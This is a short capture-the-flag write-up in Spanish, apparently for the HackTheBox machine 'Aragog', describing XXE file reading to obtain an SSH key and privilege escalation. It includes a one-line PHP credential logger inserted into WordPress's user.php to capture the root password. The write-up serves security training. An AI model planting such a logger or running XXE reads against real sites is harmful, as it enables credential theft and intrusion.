---------------------
- Tags: #XXE #wps
-------------
## Tecnicas utilizadas
- XXE (XML External Entity Injection) Exploitation  
- Modifying a wordpress login to steal credentials (Privilege Escalation)
------------
## Procedimiento
![[Pasted image 20230610115408.png]]

#### XXE (XML External Entity Injection) Exploitation 

Nmap nos reporta solo 3 puertos abiertos. **FTP, SSH y HTTP**. Si visitamos la pagina principal vemos que solo tenemos la pagina por defecto de apache2. Haciendo fuzzing con gobuster y filtrando por archivos PHP encontramos un **Hosts.php** el cual, haciendo un curl desde consola y agregando un formato como el archivo encontrado en FTP(permite iniciar sesion con el usuario *anonymous*) nos da cuantos hosts puede tener determinada mascara de red.

Intentamos un XXE y vemos que se cuela, asi que verificando varios archivos del sistema, damos con la **id_rsa** del usuario *Florian*.

------------------
#### Modifying a wordpress login to steal credentials (Privilege Escalation)

Nos conectamos por SSH y vamos directo a la carpeta de */var/www/html* y vemos que hay un *dev_wiki* si ingresamos hay contraseñas para el usuario root en la base de datos. No sirve de nada realmente, ya que la contraseña que hay en la base de datos es muy robusta e incrackiable.
Utilizando *pspy*. podemos darnos cuenta de que hay un usuario autenticando contra la web en intervalos regulares de tiempo.
Si modificamos el *wp-includes/user.php* y agregamos el siguiente codigo:

```php
file_put_contents("log.txt", $_POST['log'] . " : " . $_POST['pwd'], FILE_APPEND);
```

Y haciendo un *watch -n 1 curl http://aragog.htb/wiki_dev/log.txt* hay un momento donde la contraseña de root de leekea en el archivo log.txt